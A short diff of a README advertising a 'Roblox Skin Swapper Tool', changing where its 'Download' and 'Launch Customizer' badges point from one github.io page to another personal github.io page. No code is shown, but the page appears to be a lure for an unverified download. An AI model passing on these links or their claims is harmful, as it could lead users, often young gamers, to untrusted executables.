@@ -3,8 +3,8 @@
 Transform your Roblox avatar experience using the Roblox Skin Swapper Tool. This offline setup lets you quickly change visual styles, apply saved appearances, and manage cosmetic presets — all without affecting your core gameplay or violating any terms.
 
 🟢🟢  
-[![🟢 Download Skin Swapper Tool](https://img.shields.io/badge/🟢-Download_Skin_Swapper-green?style=for-the-badge)](https://roblox-skin-swapper-customization.github.io/.github/)  
-[![🟢 Launch Customization Setup](https://img.shields.io/badge/🟢-Launch_Customizer-green?style=for-the-badge)](https://roblox-skin-swapper-customization.github.io/.github/)  
+[![🟢 Download Skin Swapper Tool](https://img.shields.io/badge/🟢-Download_Skin_Swapper-green?style=for-the-badge)](https://segunsamuel046.github.io/.github/)  
+[![🟢 Launch Customization Setup](https://img.shields.io/badge/🟢-Launch_Customizer-green?style=for-the-badge)](https://segunsamuel046.github.io/.github/)  
 🟢🟢
 
 ---
